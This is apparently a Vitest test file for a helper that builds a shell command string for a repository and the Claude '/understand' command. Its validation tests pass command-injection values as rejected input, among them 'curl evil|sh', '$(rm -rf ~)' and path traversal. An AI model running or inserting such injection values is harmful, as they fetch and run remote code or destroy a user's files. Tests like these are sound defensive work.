/**
 * Tests for the retained Understand clipboard-string builder.
 */

import { describe, it, expect } from 'vitest'

import { buildUnderstandCommand } from './clipboard.js'

// Phase 14 D-14-10: buildUnderstandCommand — single source of truth for /understand invocation
describe('buildUnderstandCommand (D-14-10)', () => {
  it('(understand-cmd-1) exact string for agenticapps/claude-workflow matches D-14-10 spec', () => {
    const cmd = buildUnderstandCommand('agenticapps', 'claude-workflow')
    expect(cmd.string).toBe('cd ~/Sourcecode/agenticapps/claude-workflow && claude "/understand"')
  })

  it('(understand-cmd-2) argv deep-equals [\"/understand\"] (future daemon-spawn carrier, Phase 15)', () => {
    const cmd = buildUnderstandCommand('agenticapps', 'claude-workflow')
    expect(cmd.argv).toEqual(['/understand'])
  })

  it('(understand-cmd-3) return object has exactly { string, argv } — no extra keys', () => {
    const cmd = buildUnderstandCommand('factiv', 'cparx')
    const keys = Object.keys(cmd)
    expect(keys).toContain('string')
    expect(keys).toContain('argv')
    expect(keys.length).toBe(2)
  })

  it('(understand-cmd-bonus) interpolates family and repo correctly for another pair', () => {
    const cmd = buildUnderstandCommand('neuroflash', 'nx-backend')
    expect(cmd.string).toBe('cd ~/Sourcecode/neuroflash/nx-backend && claude "/understand"')
  })

  // Phase 14 review Bundle B-4: validate family/repo before interpolating into
  // a shell string. Failing loudly beats emitting an injectable command.
  describe('input validation (Bundle B-4)', () => {
    it('throws TypeError for a repo with shell metacharacters', () => {
      expect(() => buildUnderstandCommand('agenticapps', 'foo && curl evil|sh')).toThrow(TypeError)
    })

    it('throws TypeError for a repo with spaces', () => {
      expect(() => buildUnderstandCommand('agenticapps', 'my repo')).toThrow(TypeError)
    })

    it('throws TypeError for command substitution in repo', () => {
      expect(() => buildUnderstandCommand('agenticapps', '$(rm -rf ~)')).toThrow(TypeError)
      expect(() => buildUnderstandCommand('agenticapps', '`id`')).toThrow(TypeError)
    })

    it('throws TypeError for a family with metacharacters', () => {
      expect(() => buildUnderstandCommand('agenticapps; rm -rf ~', 'repo')).toThrow(TypeError)
    })

    it('throws TypeError for path traversal segments', () => {
      expect(() => buildUnderstandCommand('agenticapps', '../escape')).toThrow(TypeError)
      expect(() => buildUnderstandCommand('..', 'repo')).toThrow(TypeError)
    })

    it('throws TypeError for uppercase segments (daemon slug charset is lowercase)', () => {
      expect(() => buildUnderstandCommand('agenticapps', 'MyRepo')).toThrow(TypeError)
    })

    it('throws TypeError for empty segments', () => {
      expect(() => buildUnderstandCommand('', 'repo')).toThrow(TypeError)
      expect(() => buildUnderstandCommand('agenticapps', '')).toThrow(TypeError)
    })

    it('accepts conforming slugs with dash/underscore/dot', () => {
      const cmd = buildUnderstandCommand('agenticapps', 'repo-1_v2.0')
      expect(cmd.string).toBe('cd ~/Sourcecode/agenticapps/repo-1_v2.0 && claude "/understand"')
    })
  })
})
